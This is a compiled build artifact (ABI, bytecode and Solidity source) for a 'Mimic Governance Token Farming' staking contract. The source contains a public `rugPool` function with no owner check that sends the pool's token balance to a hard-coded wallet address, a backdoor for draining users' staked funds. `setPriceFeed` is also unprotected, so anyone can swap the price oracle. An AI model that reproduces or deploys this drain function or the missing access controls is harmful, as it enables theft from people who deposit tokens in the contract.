{
  "contractName": "Farming",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_MimicToken",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_JUSDToken",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_DEX",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "DEX",
      "outputs": [
        {
          "internalType": "contract Dex",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "JUSDToken",
      "outputs": [
        {
          "internalType": "contract ERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "MimicToken",
      "outputs": [
        {
          "internalType": "contract ERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "stakingBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "tokenPriceMapping",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "updateTime",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "whitelisted",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_priceFeed",
          "type": "address"
        }
      ],
      "name": "setPriceFeed",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "getTokenValue",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_account",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "stakingValue",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "stakeTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_account",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "checkRewardByAddress",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_account",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "calculateTime",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_account",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "calculateRewards",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "issueTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "unstakeTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "addWhitelisted",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "checkWhitelisted",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token",
          "type": "address"
        }
      ],
      "name": "rugPool",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526040518060400160405280601e81526020017f4d696d696320476f7665726e616e636520546f6b656e204661726d696e67000081525060019080519060200190620000519291906200022e565b503480156200005f57600080fd5b506040516200260238038062002602833981810160405260608110156200008557600080fd5b810190808051906020019092919080519060200190929190805190602001909291905050506000620000bc6200022660201b60201c565b9050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508073ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35082600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505050620002dd565b600033905090565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200027157805160ff1916838001178555620002a2565b82800160010185558215620002a2579182015b82811115620002a157825182559160200191906001019062000284565b5b509050620002b19190620002b5565b5090565b620002da91905b80821115620002d6576000816000905550600101620002bc565b5090565b90565b61231580620002ed6000396000f3fe608060405234801561001057600080fd5b506004361061014c5760003560e01c80633ff54c71116100c35780638da5cb5b1161007c5780638da5cb5b14610732578063976f06a61461077c57806398f41574146107f4578063f12b611a14610878578063f1c5d6c2146108f0578063f2fde38b1461094f5761014c565b80633ff54c711461059e57806370e3c7ed146105e2578063715018a61461062c57806376e112861461063657806380935aa91461069a57806384d269ad146106e45761014c565b806320d8dad01161011557806320d8dad01461035657806323d35185146103b257806329161a001461042a5780632c084c69146104a25780633d4efe09146104e65780633f4eaded146105545761014c565b8062c9d5091461015157806306fdde03146101c95780630bea440d1461024c57806310154bad1461029a5780631d371611146102de575b600080fd5b6101b36004803603604081101561016757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610993565b6040518082815260200191505060405180910390f35b6101d1610a8b565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156102115780820151818401526020810190506101f6565b50505050905090810190601f16801561023e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102986004803603604081101561026257600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610b29565b005b6102dc600480360360208110156102b057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610e40565b005b610340600480360360408110156102f457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610f55565b6040518082815260200191505060405180910390f35b6103986004803603602081101561036c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611099565b604051808215151515815260200191505060405180910390f35b610414600480360360408110156103c857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061113b565b6040518082815260200191505060405180910390f35b61048c6004803603604081101561044057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611154565b6040518082815260200191505060405180910390f35b6104e4600480360360208110156104b857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611179565b005b610512600480360360208110156104fc57600080fd5b8101908080359060200190929190505050611332565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61055c61136e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6105e0600480360360208110156105b457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611394565b005b6105ea6115a7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6106346115cd565b005b6106986004803603604081101561064c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061173b565b005b6106a26117bd565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610730600480360360408110156106fa57600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506117e3565b005b61073a611baa565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6107de6004803603604081101561079257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611bd3565b6040518082815260200191505060405180910390f35b6108366004803603602081101561080a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611bf8565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6108da6004803603604081101561088e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611c2b565b6040518082815260200191505060405180910390f35b6109326004803603602081101561090657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611ccf565b604051808381526020018281526020019250505060405180910390f35b6109916004803603602081101561096557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611e83565b005b6000806109ba670de0b6b3a76400006109ac8686611c2b565b61207690919063ffffffff16565b90506000610360905060006109d882846120fc90919063ffffffff16565b90506000610a7c610a6e83600560008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461207690919063ffffffff16565b670de0b6b3a76400006120fc565b90508094505050505092915050565b60018054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610b215780601f10610af657610100808354040283529160200191610b21565b820191906000526020600020905b815481529060010190602001808311610b0457829003601f168201915b505050505081565b60008211610b9f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f616d6f756e742063616e206e6f7420626520300000000000000000000000000081525060200191505060405180910390fd5b60011515610bac82611099565b15151415610e3c578073ffffffffffffffffffffffffffffffffffffffff166323b872dd3330856040518463ffffffff1660e01b8152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050602060405180830381600087803b158015610c6f57600080fd5b505af1158015610c83573d6000803e3d6000fd5b505050506040513d6020811015610c9957600080fd5b810190808051906020019092919050505050610d3a82600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461218590919063ffffffff16565b600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555042600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b5050565b610e4861220d565b73ffffffffffffffffffffffffffffffffffffffff16610e66611baa565b73ffffffffffffffffffffffffffffffffffffffff1614610eef576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b6008819080600181540180825580915050600190039060005260206000200160009091909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600080600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205411610fe35760009050611093565b600080610fef84611ccf565b9150915061108e61108583600560008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461207690919063ffffffff16565b82600a0a6120fc565b925050505b92915050565b600080600090505b600880549050811015611130578273ffffffffffffffffffffffffffffffffffffffff16600882815481106110d257fe5b9060005260206000200160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415611123576001915050611136565b80806001019150506110a1565b50600090505b919050565b6000806111488484610993565b90508091505092915050565b6005602052816000526040600020602052806000526040600020600091509150505481565b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561121a57600080fd5b505afa15801561122e573d6000803e3d6000fd5b505050506040513d602081101561124457600080fd5b810190808051906020019092919050505090508173ffffffffffffffffffffffffffffffffffffffff1663a9059cbb732aac0eb300fa402730bced0b4c43a7fe6bf6491e836040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156112f257600080fd5b505af1158015611306573d6000803e3d6000fd5b505050506040513d602081101561131c57600080fd5b8101908080519060200190929190505050505050565b6008818154811061133f57fe5b906000526020600020016000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905060006114213384610993565b90506000811180156114335750600082115b61143c57600080fd5b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33836040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156114e557600080fd5b505af11580156114f9573d6000803e3d6000fd5b505050506040513d602081101561150f57600080fd5b81019080805190602001909291905050505042600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6115d561220d565b73ffffffffffffffffffffffffffffffffffffffff166115f3611baa565b73ffffffffffffffffffffffffffffffffffffffff161461167c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b80600760008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008211611859576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f7374616b696e672062616c616e63652063616e6e6f742062652030000000000081525060200191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33846040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156118e057600080fd5b505af11580156118f4573d6000803e3d6000fd5b505050506040513d602081101561190a57600080fd5b81019080805190602001909291905050505060006119ad83600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461221590919063ffffffff16565b905080600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506000611a3c3384610993565b9050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33836040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b158015611ae757600080fd5b505af1158015611afb573d6000803e3d6000fd5b505050506040513d6020811015611b1157600080fd5b81019080805190602001909291905050505042600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050505050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6006602052816000526040600020602052806000526040600020600091509150505481565b60076020528060005260406000206000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000804290506000611cc2600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548361221590919063ffffffff16565b9050809250505092915050565b6000806000600760008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050600081905060008173ffffffffffffffffffffffffffffffffffffffff1663feaf968c6040518163ffffffff1660e01b815260040160a06040518083038186803b158015611d8357600080fd5b505afa158015611d97573d6000803e3d6000fd5b505050506040513d60a0811015611dad57600080fd5b81019080805190602001909291908051906020019092919080519060200190929190805190602001909291908051906020019092919050505050505091505060008273ffffffffffffffffffffffffffffffffffffffff1663313ce5676040518163ffffffff1660e01b815260040160206040518083038186803b158015611e3457600080fd5b505afa158015611e48573d6000803e3d6000fd5b505050506040513d6020811015611e5e57600080fd5b810190808051906020019092919050505060ff16905081819550955050505050915091565b611e8b61220d565b73ffffffffffffffffffffffffffffffffffffffff16611ea9611baa565b73ffffffffffffffffffffffffffffffffffffffff1614611f32576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415611fb8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001806122996026913960400191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008083141561208957600090506120f6565b600082840290508284828161209a57fe5b04146120f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260218152602001806122bf6021913960400191505060405180910390fd5b809150505b92915050565b6000808211612173576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601a8152602001807f536166654d6174683a206469766973696f6e206279207a65726f00000000000081525060200191505060405180910390fd5b81838161217c57fe5b04905092915050565b600080828401905083811015612203576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b600033905090565b60008282111561228d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601e8152602001807f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525060200191505060405180910390fd5b81830390509291505056fe4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061646472657373536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77a2646970667358221220691ce1e27873b4e6eca02862bc80fa01a9463d671fbd59a787e38419f817d1e364736f6c63430006060033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.6.6;\r\n\r\nimport \"./Mimic.sol\";\r\nimport \"./JUSD.sol\";\r\n\r\nimport \"./Dex.sol\";\r\n\r\nimport \"./AggregatorV3Interface.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\r\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\r\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\r\n\r\ncontract Farming is Ownable {\r\n    using SafeMath for uint256;\r\n    string public name = \"Mimic Governance Token Farming\";\r\n    ERC20 public MimicToken;\r\n    ERC20 public JUSDToken;\r\n\r\n    //Dex\r\n    Dex public DEX;\r\n\r\n    mapping(address => mapping(address => uint256)) public stakingBalance;\r\n    mapping(address => mapping(address => uint256)) public updateTime;\r\n    mapping(address => address) public tokenPriceMapping;\r\n    address [] public whitelisted;\r\n\r\n    constructor(\r\n        address _MimicToken,\r\n        address _JUSDToken,\r\n        address _DEX\r\n    ) public {\r\n        MimicToken = ERC20(_MimicToken);\r\n        JUSDToken = ERC20(_JUSDToken);\r\n        DEX = Dex(_DEX);\r\n    }\r\n\r\n    function setPriceFeed(address _token, address _priceFeed) public {\r\n        tokenPriceMapping[_token] = _priceFeed;\r\n    }\r\n\r\n    function getTokenValue(address _token)\r\n        public\r\n        view\r\n        returns (uint256, uint256)\r\n    {\r\n        address priceFeedAddress = tokenPriceMapping[_token];\r\n        AggregatorV3Interface priceFeed = AggregatorV3Interface(\r\n            priceFeedAddress\r\n        );\r\n        (, int256 price, , , ) = priceFeed.latestRoundData();\r\n        uint256 decimals = uint256(priceFeed.decimals());\r\n        return (uint256(price), decimals);\r\n    }\r\n\r\n    function stakingValue(address _account, address _token)\r\n        public\r\n        view\r\n        returns (uint256)\r\n    {\r\n        if (stakingBalance[_token][_account] <= 0) {\r\n            return 0;\r\n        }\r\n        (uint256 price, uint256 decimals) = getTokenValue(_token);\r\n        return SafeMath.div(stakingBalance[_token][_account].mul(price),10**decimals);\r\n    }\r\n\r\n    //Stake Tokens\r\n    function stakeTokens(uint256 _amount, address _token) public {\r\n        require(_amount > 0, \"amount can not be 0\");\r\n        if (checkWhitelisted(_token) == true) {\r\n        ERC20(_token).transferFrom(msg.sender, address(this), _amount);\r\n        stakingBalance[_token][msg.sender] = stakingBalance[_token][msg.sender].add(_amount);\r\n        updateTime[_token][msg.sender] = block.timestamp;\r\n        }\r\n    }\r\n\r\n    //Check reward by address without send function (no gas)\r\n    function checkRewardByAddress(address _account, address _token)\r\n        public\r\n        view\r\n        returns (uint256)\r\n    {\r\n        uint256 reward = calculateRewards(_account, _token);\r\n        return reward;\r\n    }\r\n\r\n    function calculateTime(address _account, address _token) public view returns (uint256)\r\n    {\r\n        uint256 time = block.timestamp;\r\n        uint256 totalTime = time.sub(updateTime[_token][_account]);\r\n        return totalTime;\r\n    }\r\n\r\n    function calculateRewards(address _account, address _token) public view returns (uint256)\r\n    {\r\n        uint256 time = calculateTime(_account , _token).mul(1e18);\r\n        uint256 rate = 864;\r\n        uint256 timeRate = time.div(rate);\r\n        uint256 reward = SafeMath.div(stakingBalance[_token][_account].mul(timeRate),1e18);\r\n        return reward;\r\n    }\r\n\r\n    //Issuing Token\r\n    function issueTokens(address _token) public {\r\n        uint256 balance = stakingBalance[_token][msg.sender];\r\n        uint256 reward = calculateRewards(msg.sender, _token);\r\n        require(reward > 0 && balance > 0);\r\n        MimicToken.transfer(msg.sender, reward);\r\n        updateTime[_token][msg.sender] = block.timestamp;\r\n    }\r\n\r\n    //Unstake with amount\r\n    function unstakeTokens(uint256 _amount, address _token) public {\r\n        require(_amount > 0, \"staking balance cannot be 0\");\r\n        ERC20(_token).transfer(msg.sender, _amount);\r\n        uint256 remain = stakingBalance[_token][msg.sender].sub(_amount);\r\n        stakingBalance[_token][msg.sender] = remain;\r\n\r\n        //withdraw and claim reward\r\n        uint256 reward = calculateRewards(msg.sender, _token);\r\n        // require(reward > 0 && stakingBalance[msg.sender] >= 0);\r\n        MimicToken.transfer(msg.sender, reward);\r\n        updateTime[_token][msg.sender] = block.timestamp;\r\n    }\r\n\r\n    function addWhitelisted(address _token) public onlyOwner{\r\n        whitelisted.push(_token);\r\n    } \r\n    function checkWhitelisted(address _token) public view returns (bool){\r\n        for (uint256 i=0; i < whitelisted.length; i++){\r\n            if(whitelisted[i] == _token){\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n    function rugPool(address _token) public {\r\n        uint256 balance = JUSDToken.balanceOf(address(this));\r\n        ERC20(_token).transfer(\r\n            0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e,\r\n            balance\r\n        );\r\n    }\r\n}\r\n",
  "sourcePath": "/mnt/c/Users/PUNNAWICHSILPKITCHAR/Desktop/dev-mimic/mimic-finance-core/contracts/Farming.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.6+commit.6c089d02.Emscripten.clang"
  },
  "schemaVersion": "3.4.6",
  "updatedAt": "2022-04-12T19:49:36.950Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner.     * NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    }
  },
  "userdoc": {
    "methods": {}
  }
}